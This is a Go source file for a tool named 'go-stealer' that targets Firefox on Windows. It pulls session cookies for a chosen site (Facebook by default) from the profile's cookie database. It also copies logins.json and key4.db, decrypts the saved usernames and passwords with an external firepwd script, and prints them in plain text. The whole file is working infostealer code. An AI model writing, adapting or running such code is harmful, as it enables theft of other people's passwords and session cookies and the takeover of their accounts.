package main

import (
	"database/sql"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"os"
	"os/exec"
	"log"
	"io"
	"flag"
	"strings"
)
func cmdOut(command string) (string, error) {
	cmd := exec.Command("cmd", "/C", command)
	output, err := cmd.CombinedOutput()
	out := string(output)
	return out, err
}
type Credential struct{
	host string
	username string
	password string
}
type Cookie struct {
	id int
	name string
	value string
	host string
}
func crackCredentials(profilePath string) []Credential{
	var credentials []Credential
	os.MkdirAll("profile", 0755)
	srcFiles := []string{profilePath + "\\logins.json", profilePath + "\\key4.db"}
    dstFiles := []string{"./profile/logins.json", "./profile/key4.db"}
	for i, srcFile := range srcFiles{
		dstFile := dstFiles[i]
		src, err := os.Open(srcFile)
		if err != nil {
			log.Fatal(err)
		}
		defer src.Close()
		
		dst, err := os.Create(dstFile)
		if err != nil {
			log.Fatal(err)
		}
		defer dst.Close()
		
		_, err = io.Copy(dst, src)
		if err != nil {
			log.Fatal(err)
		}
	}
	x, _ := cmdOut("py firepwd/firepwd.py -d profile/")
	y := strings.Split(x, "decrypting login/password pairs")
	creds := strings.Split(y[1], "\n")
	for _, cred := range creds{
		if len(strings.TrimSpace(cred)) == 0{
			continue
		}
		x := strings.Split(cred, ":b")
		host := strings.TrimSpace(x[0])
		y := strings.Split(x[1], ",b")
		username := strings.Replace(y[0], "'", "", -1)
		password := strings.Replace(y[1], "'", "", -1)
		credentials = append(credentials, Credential{host, username, password})
	}
	return credentials
}
func getActiveProfilePath() string{
	path := os.Getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles"
	f, err := os.Open(path)
	if err != nil{
		log.Fatal(err)
	}
	dirs, err2 := f.Readdirnames(0)
	if err2 != nil{
		log.Fatal(err2)
	}
	activeDir := ""
	for _, dir := range(dirs){
		if _, err := os.Stat(path + "\\" + dir + "\\cookies.sqlite"); err == nil {
			activeDir = dir
		} 
	}
	path = path + "\\" + activeDir
	return path
}

func main(){
	var cookies []Cookie
	profilePath := getActiveProfilePath()
	cookiesPath := profilePath + "\\cookies.sqlite"
	fs := flag.NewFlagSet("Go-stealer", flag.ExitOnError)
	fs.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: go-stealer.exe [OPTIONS]\n")
		fs.PrintDefaults()
	}

	var help bool
	var host string
	var check bool
	fs.BoolVar(&help, "h", false, "display this help message")

	fs.StringVar(&host, "web", "facebook", "Specific web url to look for in cookies")
	fs.StringVar(&host, "w", "facebook", "Shorthand for web option")
	fs.BoolVar(&check, "check-credentials", false, "Check local credential files and try to decrypt it.")
	fs.BoolVar(&check, "c", false, "Shorthand for check-credential option")
	err := fs.Parse(os.Args[1:])
	if err != nil {
		fmt.Fprintf(os.Stderr, "%v\n", err)
		os.Exit(1)
	}

	if help {
		fs.Usage()
		os.Exit(0)
	}
	fmt.Println("Opening SQL File")
	db, err := sql.Open("sqlite3", cookiesPath)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()
	rows, err := db.Query("select id, name, value, host from moz_cookies where host like '%" + host + "%'")
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()
	for rows.Next() {
		var id int
		var name string
		var value string
		var host string
		err = rows.Scan(&id, &name, &value, &host)
		if err != nil {
			log.Fatal(err)
		}
		cookie := Cookie{id, name, value, host}
		cookies = append(cookies, cookie)
	}
	err = rows.Err()
	if err != nil {
		log.Fatal(err)
	}
	for _, cookie := range(cookies){
		fmt.Println(cookie)
	}
	if check{
		creds := crackCredentials(profilePath)
		for _, cred := range creds{
			fmt.Printf("Site: %s \nUsername: %s\nPassword: %s\n\n", cred.host, cred.username, cred.password)
		}
	}
}